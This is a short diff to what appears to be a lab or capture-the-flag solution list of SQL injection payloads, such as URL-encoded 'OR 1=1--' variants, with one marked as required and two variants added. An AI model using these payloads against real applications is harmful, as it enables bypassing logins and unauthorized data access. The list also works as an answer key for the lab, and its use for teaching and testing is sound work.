@@ -7,11 +7,14 @@
 
 
 1. Solutions
-   1. `'+OR+1=1--`
+   1. `'+OR+1=1--` -> Required
+   *The server can also respond for the following
    1. `'OR+'1'='1--`
    1. `'OR+'1'='1'--`
+   1. `'OR+'1'--`
    1. `'OR+true--`
    1. `'OR+'a'='a'--`
+   1. `/OR+1=1--`
    
   
 
